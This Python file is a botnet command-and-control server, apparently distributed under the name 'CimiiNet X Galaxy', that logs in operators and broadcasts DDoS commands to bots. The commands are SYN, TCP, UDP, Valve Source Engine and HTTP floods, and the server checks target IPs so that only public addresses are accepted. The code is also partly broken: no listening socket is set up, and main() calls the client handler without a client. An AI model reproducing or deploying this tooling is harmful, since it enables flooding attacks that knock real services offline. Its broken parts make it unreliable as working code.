import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

bots = {}
ansi_clear = '\033[2J\033[H'

banner = f'''
Welcome to CimiiNet X Galaxy - Best Botnet - dsc.gg/exaultsdimari

{Fore.CYAN}                    .         .  <      .     .        .
{Fore.CYAN}                        .   {Fore.MAGENTA}╔══════════════════╗{Fore.CYAN}    . >
{Fore.CYAN}                      .   .  {Fore.WHITE}╔═╗┌─┐┬  ┌─┐─┐ ┬┬ ┬{Fore.CYAN}  .   .
{Fore.CYAN}                      🚀     {Fore.WHITE}║ ╦├─┤│  ├─┤┌┴┬┘└┬┘{Fore.CYAN}.   .    
{Fore.CYAN}                     .    .  {Fore.WHITE}╚═╝┴ ┴┴─┘┴ ┴┴ └─ ┴ {Fore.CYAN} . (  .
{Fore.CYAN}                     .{Fore.MAGENTA}╚════╔╩══════════════════╩╗══{Fore.CYAN}//{Fore.MAGENTA}═╝
{Fore.CYAN}                       .   {Fore.MAGENTA}║{Fore.WHITE}    > CimiiNet      {Fore.MAGENTA}║ {Fore.CYAN}🔵    
{Fore.CYAN}                           {Fore.MAGENTA}║{Fore.BLUE}dsc.gg/exaultsdimari{Fore.MAGENTA}║      
                           {Fore.MAGENTA}║{Fore.WHITE}   Made by KarssSec  {Fore.MAGENTA}║  
                          {Fore.MAGENTA}╔╩════════════════════╩╗
                         {Fore.MAGENTA} ║{Fore.WHITE}           {len(bots)} bots     {Fore.MAGENTA}║
                         {Fore.MAGENTA} ╚╦════════════════════╦╝
                         {Fore.MAGENTA}  ║{Fore.GREEN}  Connected (Serv1) {Fore.MAGENTA}║
                         {Fore.MAGENTA}  ╚════════════════════╝
        '''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;CimiiNet X Galaxy | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.CYAN}CimiiNetXGalaxy {Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, f'{Fore.CYAN}HELP{Fore.WHITE}: {Fore.MAGENTA}Shows list of commands')
                send(client, f'{Fore.CYAN}METHODS{Fore.WHITE}: {Fore.MAGENTA}Shows list of attack methods')
                send(client, f'{Fore.CYAN}CLEAR{Fore.WHITE}: {Fore.MAGENTA}Clears the screen')
                send(client, f'{Fore.CYAN}LOGOUT{Fore.WHITE}: {Fore.MAGENTA}Disconnects from CnC server')
                send(client, '')

            elif command == 'METHODS':
                send(client, f'{Fore.CYAN}.syn{Fore.WHITE}: {Fore.MAGENTA}TCP SYN flood')
                send(client, f'{Fore.CYAN}.tcp{Fore.WHITE}: {Fore.MAGENTA}TCP junk flood')
                send(client, f'{Fore.CYAN}.udp{Fore.WHITE}: {Fore.MAGENTA}UDP junk flood')
                send(client, f'{Fore.CYAN}.vse{Fore.WHITE}: {Fore.MAGENTA}UDP Valve Source Engine specific flood')
                send(client, f'{Fore.CYAN}.http{Fore.WHITE}: {Fore.MAGENTA}HTTP GET request flood')
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye :-)')
                time.sleep(1)
                break
            
            # Valve Source Engine query flood
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')

            # TCP SYNchronize flood           
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
                    
            # TCP junk data packets flood
            elif command == '.TCP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')

            # UDP junk data packets flood
            elif command == '.UDP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')

            # HTTP GET request flood
            elif command == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client):
    send(client, f'\33]0;CimiiNet X Galaxy | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.CYAN}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.CYAN}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()
    
def main():
    threading.Thread(target=handle_client).start()

if __name__ == '__main__':
    main()
